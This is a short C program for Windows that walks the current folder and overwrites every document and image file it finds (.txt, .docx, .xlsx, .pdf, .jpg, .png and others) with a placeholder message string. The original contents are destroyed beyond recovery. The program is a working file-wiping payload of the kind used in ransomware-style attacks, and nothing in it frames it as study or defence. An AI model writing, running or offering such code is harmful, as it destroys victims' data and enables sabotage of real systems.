#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

const char *EXTENSIONS[] = {".txt", ".docx", ".xlsx", ".pdf", ".jpg", ".jpeg", ".png", ".bmp"};
const int NUM_EXTENSIONS = sizeof(EXTENSIONS) / sizeof(EXTENSIONS[0]);
const char *MESSAGE = "your msg.";

int has_valid_extension(const char *filename) {
    for (int i = 0; i < NUM_EXTENSIONS; i++) {
        const char *ext = EXTENSIONS[i];
        size_t len_filename = strlen(filename);
        size_t len_ext = strlen(ext);
        if (len_filename >= len_ext &&
            _stricmp(filename + len_filename - len_ext, ext) == 0) {
            return 1;
        }
    }
    return 0;
}

void overwrite_file(const char *filepath) {
    FILE *file = fopen(filepath, "wb");
    if (file) {
        fwrite(MESSAGE, 1, strlen(MESSAGE), file);
        fclose(file);
        printf("[+] Overwritten: %s\n", filepath);
    } else {
        printf("[-] Failed to open: %s\n", filepath);
    }
}

int main() {
    WIN32_FIND_DATA fd;
    HANDLE hFind = FindFirstFile("*", &fd);

    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Failed to list files in current folder.\n");
        return 1;
    }

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            if (has_valid_extension(fd.cFileName)) {
                overwrite_file(fd.cFileName);
            }
        }
    } while (FindNextFile(hFind, &fd));

    FindClose(hFind);
    return 0;
}
